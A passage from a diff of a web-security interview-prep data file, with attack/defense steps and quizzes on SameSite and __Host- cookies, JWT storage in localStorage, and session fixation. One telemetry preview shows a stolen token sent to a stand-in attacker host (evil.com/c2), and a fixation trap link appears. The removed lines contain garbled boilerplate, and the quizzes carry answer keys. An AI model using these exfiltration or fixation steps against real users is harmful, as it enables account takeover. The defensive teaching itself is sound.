+          "protocol": "RFC 6265bis SameSite",
+          "method": "Cross-Site Navigation Check",
           "headers": [
-            "Authorization: Scope-Validated",
-            "X-Correlation-ID: 7f8a9b-2026"
+            "Sec-Fetch-Site: cross-site",
+            "Sec-Fetch-Mode: navigate",
+            "Set-Cookie: session_id=s_829148adfe9; SameSite=Lax; Secure; HttpOnly"
           ],
-          "payloadPreview": "{ \"audit_log\": \"verified\", \"action\": \"XSS Attack Script\" }",
-          "securityAction": "Backend service XSS Attack Script enforces zero-trust access control and signs responses.",
-          "statusBadge": "ENFORCED"
+          "payloadPreview": "External link click: Cookie included (top-level GET). External <img> or POST: Cookie withheld.",
+          "securityAction": "Browser evaluates request context tuple and suppresses ambient cookie dispatch on cross-site mutations.",
+          "statusBadge": "SAMESITE VERIFIED"
         }
       },
       {
         "id": 4,
         "label": "Interview line",
-        "from": "browser",
-        "to": "csrf_shield",
-        "packet": "Cross-site request cookie stripped (SameSite=Lax)",
-        "caption": "Step 4: Interview line: \"Always configure the defensive cookie trifecta: Secure prevents plaintext transmission, HttpOnly prevents XSS exfiltration, and SameSite=Lax prevents cross-site request forgery.\"",
+        "from": "server",
+        "to": "browser",
+        "packet": "Prefix Defense: __Host-session_id (Domain & Path Locked)",
+        "caption": "Step 4: Interview line: \"A production session cookie must configure HttpOnly to stop XSS theft, Secure to prevent plaintext interception, SameSite=Lax or Strict for CSRF defense, and the __Host- prefix to lock domain and path.\"",
         "status": "defense",
         "isInterviewLine": true,
         "whatIsHappeningTitle": "Step 4: Interview line",
-        "whatIsHappeningText": "Step 4: Interview line: \"Always configure the defensive cookie trifecta: Secure prevents plaintext transmission, HttpOnly prevents XSS exfiltration, and SameSite=Lax prevents cross-site request forgery.\"",
+        "whatIsHappeningText": "Step 4: Interview line: \"A production session cookie must configure HttpOnly to stop XSS theft, Secure to prevent plaintext interception, SameSite=Lax or Strict for CSRF defense, and the __Host- prefix to lock domain and path.\"",
         "terms": [
           {
-            "term": "SameSite=Lax",
-            "definition": "Restricts cookie transmission on cross-origin requests, mitigating CSRF by default."
+            "term": "__Host- Cookie Prefix",
+            "definition": "Cookie prefix requiring Secure flag, Path=/, and NO Domain attribute, preventing subdomain cookie tossing/overwriting."
+          },
+          {
+            "term": "Cookie Tossing Attack",
+            "definition": "A vulnerability where a compromised subdomain sets a wildcard domain cookie to hijack session state on the apex domain."
           }
         ],
-        "deepExplanation": "Step 4 delivers the definitive security outcome. The architecture neutralizes malicious vectors, isolates untrusted actors, and provides tamper-evident proof to client callers and logging systems.",
-        "whyItMatters": "Provides resilient defense-in-depth, ensuring that even if one layer degrades, the core system remains secure.",
-        "securityVerdict": "Senior interview defense formula satisfied.",
+        "deepExplanation": "Senior candidates highlight cookie prefixes defined in RFC 6265bis. A cookie named '__Host-SessionId' cannot be set or overwritten by subdomains (e.g. blog.example.com), MUST have Path=/, and MUST have the Secure flag. This completely defeats cookie-tossing attacks where a compromised subdomain injects fake session tokens into the parent app.",
+        "whyItMatters": "Prevents lateral subdomain compromise from compromising core application session integrity.",
+        "securityVerdict": "Maximum cookie hardening standard achieved.",
         "telemetry": {
-          "protocol": "Defensive Mitigation Layer",
-          "method": "Policy Enforcement / Verdict",
+          "protocol": "RFC 6265bis Cookie Prefixes",
+          "method": "HTTP/2 Hardened Set-Cookie",
           "headers": [
-            "X-Protection-Standard: Enterprise-Grade",
-            "Strict-Transport-Security: max-age=63072000"
+            "Set-Cookie: __Host-session=a98f12c4; Secure; HttpOnly; SameSite=Lax; Path=/",
+            "Cache-Control: no-store, private"
           ],
-          "payloadPreview": "{ \"security_outcome\": \"Protected\", \"takeaway\": \"The trifecta of Secure + HttpOnly + SameSite=Lax provides robust, brow...\" }",
-          "securityAction": "Final defensive control verified: SameSite Boundary secured against exploitation.",
-          "statusBadge": "200 PROTECTED"
+          "payloadPreview": "Cookie Prefix Verification: Secure=true, Path=/, Domain attribute absent. Subdomain isolation locked.",
+          "securityAction": "Browser validates strict prefix invariants; rejects any attempt by subdomains to overwrite session.",
+          "statusBadge": "__HOST- LOCKED"
         }
       }
     ],
@@ -1310,15 +1325,15 @@ export const questionsData: QuestionData[] = [
     "tier": "Core",
     "interviewTakeaway": "The trifecta of Secure + HttpOnly + SameSite=Lax provides robust, browser-level defense-in-depth across the three major web vulnerability classes: Eavesdropping, XSS exfiltration, and CSRF.",
     "quiz": {
-      "question": "What is the most effective security control to resolve: \"How do Secure, HttpOnly, and SameSite cookie attributes protect web applications?\"?",
+      "question": "What is the security significance of the '__Host-' cookie prefix defined in RFC 6265bis?",
       "options": [
-        "Cross-site request cookie stripped (SameSite=Lax)",
-        "Rely on frontend UI obfuscation and hidden buttons",
-        "Disable all CORS headers globally",
-        "Store all sensitive session secrets in localStorage"
+        "It forces the cookie to have the Secure flag, Path=/, and forbids the Domain attribute, preventing compromised subdomains from overwriting apex domain cookies (cookie tossing)",
+        "It automatically encrypts the cookie on the client machine using Windows DPAPI or macOS Keychain",
+        "It restricts cookie access to internal server-side microservices via gRPC calls",
+        "It causes the cookie to self-destruct after 5 minutes of browser inactivity"
       ],
       "correctIndex": 0,
-      "explanation": "The trifecta of Secure + HttpOnly + SameSite=Lax provides robust, browser-level defense-in-depth across the three major web vulnerability classes: Eavesdropping, XSS exfiltration, and CSRF."
+      "explanation": "The '__Host-' prefix enforces strict browser invariants: the cookie must be Secure, have Path=/, and cannot specify a Domain attribute. This guarantees the cookie can only be set and read by the exact host that issued it, preventing malicious subdomains from injecting shadow cookies."
     }
   },
   {
@@ -1356,140 +1371,144 @@ export const questionsData: QuestionData[] = [
     "steps": [
       {
         "id": 1,
-        "label": "Token in localStorage",
-        "from": "xss_payload",
-        "to": "local_storage",
-        "packet": "localStorage.getItem(\"access_token\")",
-        "caption": "Step 1: Insecure practice: Storing JWT tokens in localStorage makes them immediately exfiltratable by any third-party script or XSS vulnerability.",
+        "label": "localStorage Exposure (XSS Vulnerability)",
+        "from": "client",
+        "to": "attacker",
+        "packet": "localStorage.getItem('jwt_token') exfiltrated via injected script",
+        "caption": "Step 1: Storing JWTs in localStorage makes them trivially accessible to any XSS payload or malicious third-party npm package.",
         "status": "attack",
-        "whatIsHappeningTitle": "Step 1: Token in localStorage",
-        "whatIsHappeningText": "Step 1: Insecure practice: Storing JWT tokens in localStorage makes them immediately exfiltratable by any third-party script or XSS vulnerability.",
+        "whatIsHappeningTitle": "Step 1: localStorage Exposure",
+        "whatIsHappeningText": "Step 1: Storing JWTs in localStorage makes them trivially accessible to any XSS payload or malicious third-party npm package.",
         "terms": [
           {
-            "term": "HttpOnly",
-            "definition": "Flag preventing JavaScript document.cookie access, defeating XSS token theft."
+            "term": "Web Storage (localStorage)",
+            "definition": "Client-side key-value storage accessible synchronously by any JavaScript running in the same origin."
           },
           {
-            "term": "Secure Flag",
-            "definition": "Mandates cookie transmission strictly over encrypted HTTPS connections."
+            "term": "Supply-Chain Script Injection",
+            "definition": "Malicious code injected via compromised dependencies (npm) that scans client memory and storage for API keys and tokens."
           }
         ],
-        "deepExplanation": "Step 1 begins with the client issuing the baseline communication packet. The network transport layer establishes TLS 1.3 mutual parameters and delivers the initial payload to the entrypoint perimeter.",
-        "whyItMatters": "Establishes a hardened encryption baseline before any sensitive security claims or tokens are exchanged.",
-        "securityVerdict": "Secure transport layer guarantees confidentiality in transit.",
+        "deepExplanation": "localStorage has zero access control boundaries against scripts executing in the same origin. Any Cross-Site Scripting (XSS) vulnerability, rogue analytics tag, or compromised open-source npm package can execute window.localStorage.getItem('token') and exfiltrate credentials to an attacker's command-and-control server.",
+        "whyItMatters": "Exfiltrated JWTs can be replayed offline by the attacker until their expiration timestamp passes, bypassing all client-side protections.",
+        "securityVerdict": "Critical architectural vulnerability: high-privilege tokens must never reside in accessible Web Storage.",
         "telemetry": {
-          "protocol": "TLS 1.3 / HTTP Protocol Stack",
-          "method": "Client Request Initiation",
+          "protocol": "DOM Storage API",
+          "method": "localStorage.getItem()",
           "headers": [
-            "Host: api.token.io",
-            "User-Agent: EnterpriseSec-Agent/4.2",
-            "Sec-Fetch-Mode: cors"
+            "Source: Injected XSS Vector",
+            "Execution-Context: Window (document.origin)"
           ],
-          "payloadPreview": "{ \"context\": \"initial_handshake\", \"target\": \"XSS Attacker\" }",
-          "securityAction": "Client establishes encrypted TLS tunnel and initiates protocol handshake to XSS Attacker.",
-          "statusBadge": "INITIALIZED"
+          "payloadPreview": "Token Exfiltration: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9... -> Transmitted to https://evil.com/c2",
+          "securityAction": "Runtime grants unconstrained read access to origin JavaScript; token intercepted.",
+          "statusBadge": "TOKEN LEAKED"
         }
       },
       {
         "id": 2,
-        "label": "Offline Token Replay",
-        "from": "xss_payload",
-        "to": "xss_payload",
-        "packet": "Exfiltrated JWT replayed from attacker laptop",
-        "caption": "Step 2: Attacker steals raw bearer token and impersonates the victim from anywhere in the world until token expiration.",
-        "status": "attack",
-        "whatIsHappeningTitle": "Step 2: Offline Token Replay",
-        "whatIsHappeningText": "Step 2: Attacker steals raw bearer token and impersonates the victim from anywhere in the world until token expiration.",
+        "label": "HttpOnly Cookie Defense (Script Inaccessible)",
+        "from": "server",
+        "to": "browser",
+        "packet": "Set-Cookie: access_token=...; HttpOnly; Secure; SameSite=Lax",
+        "caption": "Step 2: Storing the token in an HttpOnly, Secure, SameSite cookie isolates it completely from the JavaScript runtime.",
+        "status": "defense",
+        "whatIsHappeningTitle": "Step 2: HttpOnly Cookie Defense",
+        "whatIsHappeningText": "Step 2: Storing the token in an HttpOnly, Secure, SameSite cookie isolates it completely from the JavaScript runtime.",
         "terms": [
           {
-            "term": "Preflight (OPTIONS)",
-            "definition": "An automatic HTTP request verifying whether cross-origin methods/headers are permitted."
+            "term": "HttpOnly Isolation",
+            "definition": "Hides the cookie from document.cookie, making it impossible for injected XSS scripts to extract the raw token string."
           },
           {
-            "term": "CORS Headers",
-            "definition": "Response headers informing the browser if response reading is permitted."
+            "term": "Ambient Cookie Attachment",
+            "definition": "The automatic browser behavior of attaching matching domain cookies to outgoing network requests."
           }
         ],
-        "deepExplanation": "In Step 2, the intermediary security layer intercepts the packet. It inspects parameters against policy definitions, decodes headers, evaluates rate limits, and validates compliance with security RFCs.",
-        "whyItMatters": "Catches malformed payloads, injection vectors, and unauthorized origin traffic at the outer perimeter.",
-        "securityVerdict": "Perimeter enforcement prevents unauthorized computational load on backend servers.",
+        "deepExplanation": "Moving token storage to an HttpOnly cookie creates a cryptographic wall. Because JavaScript cannot inspect the cookie, an XSS attacker cannot copy or steal the token. While the attacker could still attempt on-page request forgery, they cannot walk away with the user's permanent credential to use on other machines.",
+        "whyItMatters": "Reduces catastrophic account takeover to localized on-page manipulation that can be countered with CSP.",
+        "securityVerdict": "Script isolation established; token theft via document.cookie neutralized.",
         "telemetry": {
-          "protocol": "Security Inspection Engine",
-          "method": "Boundary Security Assessment",
+          "protocol": "RFC 6265bis Secure Cookie",
+          "method": "HTTP/2 Set-Cookie Header",
           "headers": [
-            "X-Forwarded-For: 198.51.100.24",
-            "X-Security-Policy: Strict-Enforce"
+            "Set-Cookie: __Host-token=eyJhbGciOi...; HttpOnly; Secure; SameSite=Lax; Path=/",
+            "Cache-Control: no-store"
           ],
-          "payloadPreview": "{ \"threat_score\": 0.02, \"rate_limit_tokens\": 98, \"status\": \"inspected\" }",
-          "securityAction": "Intermediary proxy XSS Attacker validates protocol parameters and inspects request semantics.",
-          "statusBadge": "INSPECTED"
+          "payloadPreview": "Cookie stored in protected browser enclave. document.cookie read returns null.",
+          "securityAction": "Browser engine enforces script isolation; token automatically attached only to valid API network calls.",
+          "statusBadge": "HTTPONLY SHIELD"
         }
       },
       {
         "id": 3,
-        "label": "HttpOnly Storage Shield",
-        "from": "xss_payload",
-        "to": "httponly_cookie",
-        "packet": "document.cookie (Blocked by Browser)",
-        "caption": "Step 3: Storing session tokens in HttpOnly cookies prevents JavaScript from reading raw credentials even during an active XSS event.",
+        "label": "CSRF Risk Mitigation",
+        "from": "attacker",
+        "to": "server",
+        "packet": "Cross-site request blocked by SameSite=Lax and Anti-CSRF Header",
+        "caption": "Step 3: Storing tokens in cookies introduces CSRF exposure; defend with SameSite=Lax and custom X-Requested-With headers.",
         "status": "defense",
-        "whatIsHappeningTitle": "Step 3: HttpOnly Storage Shield",
-        "whatIsHappeningText": "Step 3: Storing session tokens in HttpOnly cookies prevents JavaScript from reading raw credentials even during an active XSS event.",
+        "whatIsHappeningTitle": "Step 3: CSRF Risk Mitigation",
+        "whatIsHappeningText": "Step 3: Storing tokens in cookies introduces CSRF exposure; defend with SameSite=Lax and custom X-Requested-With headers.",
         "terms": [
           {
-            "term": "Authorization Check",
-            "definition": "Validating permission scopes and roles before granting resource access."
+            "term": "CSRF Trade-Off",
+            "definition": "The browser's automatic sending of cookies on cross-origin requests creates CSRF attack surface that storage in localStorage avoids."
           },
           {
-            "term": "Payload Security",
-            "definition": "Ensuring data transmission integrity and confidentiality over HTTPS."
+            "term": "Synchronizer Header",
+            "definition": "Custom request header (e.g. X-Requested-With or custom anti-CSRF token) that cross-origin HTML forms cannot send."
           }
         ],
-        "deepExplanation": "Step 3 represents backend core execution. Identity claims, digital signatures, or authorization scopes are cryptographically asserted and persisted to the audit trail before operations proceed.",
-        "whyItMatters": "Guarantees zero-trust principle: never trust the perimeter alone; always verify identity and intent.",
-        "securityVerdict": "Cryptographic assertion ensures tamper-proof verification.",
+        "deepExplanation": "Storing tokens in cookies protects against XSS token exfiltration, but introduces CSRF risk because browsers attach cookies automatically. To solve this, production architectures pair SameSite=Lax cookies with custom HTTP headers (e.g. 'X-CSRF-Token' or 'X-Requested-With'). Because cross-origin HTML forms cannot attach custom headers, CSRF attacks are prevented.",
+        "whyItMatters": "Eliminates the primary trade-off objection to using cookie-based token storage.",
+        "securityVerdict": "Dual defense: HttpOnly stops token theft; anti-CSRF headers stop ambient request forgery.",
         "telemetry": {
-          "protocol": "Backend Core Architecture",
-          "method": "Cryptographic & Identity Verification",
+          "protocol": "HTTP/2 API Gateway Check",
+          "method": "POST /api/v1/transfers",
           "headers": [
-            "Authorization: Scope-Validated",
-            "X-Correlation-ID: 7f8a9b-2026"
+            "Cookie: __Host-token=eyJhbGciOi...",
+            "X-CSRF-Token: 3f8a912c...",
+            "Sec-Fetch-Site: same-origin"
           ],
-          "payloadPreview": "{ \"audit_log\": \"verified\", \"action\": \"HttpOnly Cookie\" }",
-          "securityAction": "Backend service HttpOnly Cookie enforces zero-trust access control and signs responses.",
-          "statusBadge": "ENFORCED"
+          "payloadPreview": "{ \"recipient\": \"usr_491\", \"amount\": 250.00 }",
+          "securityAction": "Gateway verifies cookie signature and matches X-CSRF-Token header before executing database transaction.",
+          "statusBadge": "CSRF VERIFIED"
         }
       },
       {
         "id": 4,
         "label": "Interview line",
-        "from": "httponly_cookie",
-        "to": "bff_gateway",
-        "packet": "BFF Session Cookie <-> Downstream OAuth Bearer",
-        "caption": "Step 4: Interview line: \"Never store persistent authentication tokens in localStorage — store sessions in HttpOnly, Secure, SameSite cookies or implement the Backend-For-Frontend pattern to keep raw access tokens off the client entirely.\"",
+        "from": "server",
+        "to": "client",
+        "packet": "Architectural Pattern: Backend-For-Frontend (BFF)",
+        "caption": "Step 4: Interview line: \"The gold standard for SPAs is the Backend-For-Frontend (BFF) pattern: tokens are stored in server-side session memory, while the browser only holds an encrypted, HttpOnly, SameSite session cookie.\"",
         "status": "defense",
         "isInterviewLine": true,
         "whatIsHappeningTitle": "Step 4: Interview line",
-        "whatIsHappeningText": "Step 4: Interview line: \"Never store persistent authentication tokens in localStorage — store sessions in HttpOnly, Secure, SameSite cookies or implement the Backend-For-Frontend pattern to keep raw access tokens off the client entirely.\"",
+        "whatIsHappeningText": "Step 4: Interview line: \"The gold standard for SPAs is the Backend-For-Frontend (BFF) pattern: tokens are stored in server-side session memory, while the browser only holds an encrypted, HttpOnly, SameSite session cookie.\"",
         "terms": [
           {
-            "term": "SameSite=Lax",
-            "definition": "Restricts cookie transmission on cross-origin requests, mitigating CSRF by default."
+            "term": "Backend-For-Frontend (BFF) Pattern",
+            "definition": "An architectural pattern where a lightweight server proxy manages tokens and API communication on behalf of a frontend SPA."
+          },
+          {
+            "term": "Token Confinement",
+            "definition": "Keeping high-value OAuth access and refresh tokens confined strictly to server-side environments."
           }
         ],
-        "deepExplanation": "Step 4 delivers the definitive security outcome. The architecture neutralizes malicious vectors, isolates untrusted actors, and provides tamper-evident proof to client callers and logging systems.",
-        "whyItMatters": "Provides resilient defense-in-depth, ensuring that even if one layer degrades, the core system remains secure.",
-        "securityVerdict": "Senior interview defense formula satisfied.",
+        "deepExplanation": "In the modern BFF architecture, the frontend SPA never handles raw JWTs or OAuth refresh tokens. The BFF proxy exchanges authorization codes, holds the tokens in server memory or encrypted Redis, and establishes a secure HttpOnly session with the browser. When the SPA makes an API call, the BFF injects the Bearer token downstream.",
+        "whyItMatters": "Eliminates both localStorage XSS token theft and browser cookie parsing complexities entirely.",
+        "securityVerdict": "Zero client-side token exposure achieved via BFF architecture.",
         "telemetry": {
-          "protocol": "Defensive Mitigation Layer",
-          "method": "Policy Enforcement / Verdict",
+          "protocol": "BFF Token Proxy Pattern",
+          "method": "Secure Token Relay",
           "headers": [
-            "X-Protection-Standard: Enterprise-Grade",
-            "Strict-Transport-Security: max-age=63072000"
+            "Downstream: Authorization: Bearer eyJhbGciOi...",
+            "Upstream-Client: Cookie: __Host-bff-session=98a1f2"
           ],
-          "payloadPreview": "{ \"security_outcome\": \"Protected\", \"takeaway\": \"The gold standard for Single Page Applications is in-memory token stor...\" }",
-          "securityAction": "Final defensive control verified: BFF Gateway secured against exploitation.",
-          "statusBadge": "200 PROTECTED"
+          "payloadPreview": "SPA communicates with BFF via cookie; BFF injects Bearer token directly into microservice mesh.",
+          "securityAction": "BFF terminates browser session; injects short-lived JWT into downstream service calls.",
+          "statusBadge": "BFF SECURED"
         }
       }
     ],
@@ -1526,15 +1545,15 @@ export const questionsData: QuestionData[] = [
     "tier": "Core",
     "interviewTakeaway": "The gold standard for Single Page Applications is in-memory token storage paired with a secure HttpOnly refresh token cookie, or an architectural BFF proxy that handles token lifecycle on the backend.",
     "quiz": {
-      "question": "What is the most effective security control to resolve: \"Where should authentication tokens be stored: HttpOnly Cookies vs localStorage vs Memory?\"?",
+      "question": "Why do security architects strongly discourage storing access and refresh tokens in browser localStorage for Single Page Applications (SPAs)?",
       "options": [
-        "BFF Session Cookie <-> Downstream OAuth Bearer",
-        "Rely on frontend UI obfuscation and hidden buttons",
-        "Disable all CORS headers globally",
-        "Store all sensitive session secrets in localStorage"
+        "Because localStorage has no script isolation: any XSS flaw or rogue third-party dependency can read and exfiltrate the raw token for offline attacker reuse",
+        "Because localStorage is cleared automatically every time a user refreshes the page",
+        "Because localStorage cannot hold strings longer than 128 characters, truncating most JWT signatures",
+        "Because web browsers charge monthly licensing fees for storing authentication tokens in localStorage"
       ],
       "correctIndex": 0,
-      "explanation": "The gold standard for Single Page Applications is in-memory token storage paired with a secure HttpOnly refresh token cookie, or an architectural BFF proxy that handles token lifecycle on the backend."
+      "explanation": "localStorage is readable by any JavaScript executing within the origin. An XSS vulnerability allows attackers to extract tokens and use them offline until expiration. Storing tokens in HttpOnly cookies or using the Backend-For-Frontend (BFF) pattern prevents client-side script access."
     }
   },
   {
@@ -1572,144 +1591,143 @@ export const questionsData: QuestionData[] = [
     "steps": [
       {
         "id": 1,
-        "label": "Session Trap Placed",
+        "label": "Attacker Traps Pre-Session ID",
         "from": "attacker",
-        "to": "victim",
-        "packet": "Trap Link: https://site.com/?sid=ATTACKER_ID",
-        "caption": "Step 1: Attacker obtains an unauthenticated session ID (ATTACKER_ID) and tricks the victim into browsing the site with that fixed ID.",
+        "to": "server",
+        "packet": "GET /login (Server issues unauthenticated session_id=ATTACKER_ID)",
+        "caption": "Step 1: Attacker connects to target site anonymously, obtains valid session ID 'FIXED_999', and crafts trap link for victim.",
         "status": "attack",
-        "whatIsHappeningTitle": "Step 1: Session Trap Placed",
-        "whatIsHappeningText": "Step 1: Attacker obtains an unauthenticated session ID (ATTACKER_ID) and tricks the victim into browsing the site with that fixed ID.",
+        "whatIsHappeningTitle": "Step 1: Attacker Traps Pre-Session ID",
+        "whatIsHappeningText": "Step 1: Attacker connects to target site anonymously, obtains valid session ID 'FIXED_999', and crafts trap link for victim.",
         "terms": [
           {
-            "term": "Origin",
-            "definition": "The unique tuple of protocol scheme, hostname, and port number."
+            "term": "Session Fixation",
+            "definition": "An attack where an adversary forces a victim to use a known session identifier, then hijacks the session once the victim authenticates."
           },
           {
-            "term": "SOP Boundary",
-            "definition": "Browser security rule isolating DOM and network access across different origins."
+            "term": "Pre-Authentication Session",
+            "definition": "A session identifier generated for an anonymous user prior to logging in."
           }
         ],
-        "deepExplanation": "Step 1 begins with the client issuing the baseline communication packet. The network transport layer establishes TLS 1.3 mutual parameters and delivers the initial payload to the entrypoint perimeter.",
-        "whyItMatters": "Establishes a hardened encryption baseline before any sensitive security claims or tokens are exchanged.",
-        "securityVerdict": "Secure transport layer guarantees confidentiality in transit.",
+        "deepExplanation": "In a session fixation attack, the adversary visits the web app anonymously to acquire a legitimate session token ('FIXED_999'). The attacker then constructs a trap URL (e.g. https://app.com/login?sid=FIXED_999 or uses a subdomain XSS to plant the cookie) and lures the target victim to log in with that specific identifier.",
+        "whyItMatters": "Allows the attacker to predict the exact session token that will hold authenticated privileges after user login.",
+        "securityVerdict": "Reconnaissance completed: attacker establishes target fixed session ID.",
         "telemetry": {
-          "protocol": "TLS 1.3 / HTTP Protocol Stack",
-          "method": "Client Request Initiation",
+          "protocol": "HTTP/1.1 Anonymous Session Initialization",
+          "method": "GET /login",
           "headers": [
-            "Host: api.session.io",
-            "User-Agent: EnterpriseSec-Agent/4.2",
-            "Sec-Fetch-Mode: cors"
+            "Host: vulnerable-bank.com",
+            "User-Agent: AttackerProbe/1.0"
           ],
-          "payloadPreview": "{ \"context\": \"initial_handshake\", \"target\": \"Victim User\" }",
-          "securityAction": "Client establishes encrypted TLS tunnel and initiates protocol handshake to Victim User.",
-          "statusBadge": "INITIALIZED"
+          "payloadPreview": "Set-Cookie: session_id=FIXED_999; Path=/",
+          "securityAction": "Server issues pre-authenticated session cookie without binding to authenticated principal.",
+          "statusBadge": "TRAP GENERATED"
         }
       },
       {
         "id": 2,
-        "label": "Victim Logs In",
+        "label": "Victim Authenticates on Fixed Session",
         "from": "victim",
-        "to": "auth_server",
-        "packet": "POST /login [Cookie: sid=ATTACKER_ID, user=alice]",
-        "caption": "Step 2: Victim logs into their personal account. Vulnerable server authenticates the user but keeps the identical session identifier.",
+        "to": "server",
+        "packet": "POST /login (Credentials submitted using cookie: session_id=FIXED_999)",
+        "caption": "Step 2: Flaw: Victim logs in successfully, but the vulnerable application retains the pre-existing session ID instead of regenerating it.",
         "status": "attack",
-        "whatIsHappeningTitle": "Step 2: Victim Logs In",
-        "whatIsHappeningText": "Step 2: Victim logs into their personal account. Vulnerable server authenticates the user but keeps the identical session identifier.",
+        "whatIsHappeningTitle": "Step 2: Victim Authenticates on Fixed Session",
+        "whatIsHappeningText": "Step 2: Flaw: Victim logs in successfully, but the vulnerable application retains the pre-existing session ID instead of regenerating it.",
         "terms": [
           {
-            "term": "Preflight (OPTIONS)",
-            "definition": "An automatic HTTP request verifying whether cross-origin methods/headers are permitted."
+            "term": "Privilege Elevation Vulnerability",
+            "definition": "Failing to discard an untrusted anonymous session ID when the session state transitions to authenticated."
           },
           {
-            "term": "CORS Headers",
-            "definition": "Response headers informing the browser if response reading is permitted."
+            "term": "Session Adoption",
+            "definition": "The dangerous server behavior of adopting client-provided session tokens from URLs or request headers."
           }
         ],
-        "deepExplanation": "In Step 2, the intermediary security layer intercepts the packet. It inspects parameters against policy definitions, decodes headers, evaluates rate limits, and validates compliance with security RFCs.",
-        "whyItMatters": "Catches malformed payloads, injection vectors, and unauthorized origin traffic at the outer perimeter.",
-        "securityVerdict": "Perimeter enforcement prevents unauthorized computational load on backend servers.",
+        "deepExplanation": "The victim clicks the link, enters their username and password, and passes authentication. However, the flawed backend application simply mutates the session store: it marks 'FIXED_999' as authenticated to 'user: alice'. Because the session identifier never changed, the attacker still holds the exact key to Alice's account.",
+        "whyItMatters": "Direct account takeover without needing the victim's password or cracking password hashes.",
+        "securityVerdict": "Catastrophic failure: session privileges elevated without regenerating session token.",
         "telemetry": {
-          "protocol": "Security Inspection Engine",
-          "method": "Boundary Security Assessment",
+          "protocol": "HTTP/2 Authenticated Login",
+          "method": "POST /login",
           "headers": [
-            "X-Forwarded-For: 198.51.100.24",
-            "X-Security-Policy: Strict-Enforce"
+            "Host: vulnerable-bank.com",
+            "Cookie: session_id=FIXED_999"
           ],
-          "payloadPreview": "{ \"threat_score\": 0.02, \"rate_limit_tokens\": 98, \"status\": \"inspected\" }",
-          "securityAction": "Intermediary proxy Victim User validates protocol parameters and inspects request semantics.",
-          "statusBadge": "INSPECTED"
+          "payloadPreview": "{\"username\": \"alice\", \"password\": \"••••••••\"}",
+          "securityAction": "Vulnerable Server: Authenticated user alice successfully, but maintained session_id=FIXED_999.",
+          "statusBadge": "SESSION FIXED"
         }
       },
       {
         "id": 3,
         "label": "Attacker Hijacks Account",
         "from": "attacker",
-        "to": "auth_server",
-        "packet": "GET /dashboard [Cookie: sid=ATTACKER_ID] -> Access Granted",
-        "caption": "Step 3: Because the session ID did not change upon privilege transition, the attacker uses their known ID to access Alice's account.",
+        "to": "server",
+        "packet": "GET /account/balance (Cookie: session_id=FIXED_999 -> Full Access)",
+        "caption": "Step 3: Attacker uses their retained copy of 'FIXED_999' to query the API, immediately gaining full access to the victim's session.",
         "status": "attack",
         "whatIsHappeningTitle": "Step 3: Attacker Hijacks Account",
-        "whatIsHappeningText": "Step 3: Because the session ID did not change upon privilege transition, the attacker uses their known ID to access Alice's account.",
+        "whatIsHappeningText": "Step 3: Attacker uses their retained copy of 'FIXED_999' to query the API, immediately gaining full access to the victim's session.",
         "terms": [
           {
-            "term": "Authorization Check",
-            "definition": "Validating permission scopes and roles before granting resource access."
+            "term": "Session Hijacking",
+            "definition": "Exploiting a valid stolen or fixed session token to masquerade as the authorized user."
           },
           {
-            "term": "Payload Security",
-            "definition": "Ensuring data transmission integrity and confidentiality over HTTPS."
+            "term": "Concurrent Session Hijack",
+            "definition": "Both victim and attacker simultaneously interact with the application using the shared session identifier."
           }
         ],
-        "deepExplanation": "Step 3 represents backend core execution. Identity claims, digital signatures, or authorization scopes are cryptographically asserted and persisted to the audit trail before operations proceed.",
-        "whyItMatters": "Guarantees zero-trust principle: never trust the perimeter alone; always verify identity and intent.",
-        "securityVerdict": "Cryptographic assertion ensures tamper-proof verification.",
+        "deepExplanation": "Because 'FIXED_999' was never invalidated, the attacker issues requests using the token they originally created. The server looks up 'FIXED_999' in Redis, sees it is associated with Alice, and returns her financial records and private data, completing the account takeover.",
+        "whyItMatters": "Demonstrates how authentication security relies on token lifecycle management, not just password strength.",
+        "securityVerdict": "Account hijacked through pre-set session exploitation.",
         "telemetry": {
-          "protocol": "Backend Core Architecture",
-          "method": "Cryptographic & Identity Verification",
+          "protocol": "HTTP/2 Malicious Session Access",
+          "method": "GET /api/v1/account",
           "headers": [
-            "Authorization: Scope-Validated",
-            "X-Correlation-ID: 7f8a9b-2026"
+            "Host: vulnerable-bank.com",
+            "Cookie: session_id=FIXED_999"
           ],
-          "payloadPreview": "{ \"audit_log\": \"verified\", \"action\": \"Auth Server\" }",
-          "securityAction": "Backend service Auth Server enforces zero-trust access control and signs responses.",
-          "statusBadge": "ENFORCED"
+          "payloadPreview": "{ \"user\": \"alice\", \"balance\": 14250.00, \"role\": \"customer\" }",
+          "securityAction": "Server grants authenticated session access to attacker using the fixed session token.",
+          "statusBadge": "ACCOUNT HIJACKED"
         }
       },
       {
         "id": 4,
         "label": "Interview line",
-        "from": "auth_server",
-        "to": "secure_session",
-        "packet": "Set-Cookie: sid=NEW_CRYPTOGRAPHIC_ID; HttpOnly",
-        "caption": "Step 4: Interview line: \"To prevent session fixation, servers must destroy the pre-authentication session and issue a newly generated, cryptographically random session ID immediately upon any successful login or privilege change.\"",
+        "from": "server",
+        "to": "victim",
+        "packet": "Defense: Invalidate Old ID + Set-Cookie: session_id=NEW_RANDOM_UUID",
+        "caption": "Step 4: Interview line: \"To defeat Session Fixation, applications must execute session regeneration upon any privilege boundary change: destroy the pre-auth session and issue a cryptographically random new session ID upon login.\"",
         "status": "defense",
         "isInterviewLine": true,
         "whatIsHappeningTitle": "Step 4: Interview line",
-        "whatIsHappeningText": "Step 4: Interview line: \"To prevent session fixation, servers must destroy the pre-authentication session and issue a newly generated, cryptographically random session ID immediately upon any successful login or privilege change.\"",
+        "whatIsHappeningText": "Step 4: Interview line: \"To defeat Session Fixation, applications must execute session regeneration upon any privilege boundary change: destroy the pre-auth session and issue a cryptographically random new session ID upon login.\"",
         "terms": [
           {
-            "term": "Defense In Depth",
-            "definition": "Layering multiple independent security controls to protect against single-point failure."
+            "term": "Session Regeneration",
+            "definition": "Destroying the existing session identifier and allocating a brand-new cryptographic token upon login or privilege escalation."
           },
           {
-            "term": "Interview Verdict",
-            "definition": "The core architecture principle to articulate to the interviewer."
+            "term": "OWASP Session Management Cheat Sheet",
+            "definition": "Standardized guidelines for session ID length (128-bit entropy), secure generation (CSPRNG), and lifecycle destruction."
           }
         ],
-        "deepExplanation": "Step 4 delivers the definitive security outcome. The architecture neutralizes malicious vectors, isolates untrusted actors, and provides tamper-evident proof to client callers and logging systems.",
-        "whyItMatters": "Provides resilient defense-in-depth, ensuring that even if one layer degrades, the core system remains secure.",
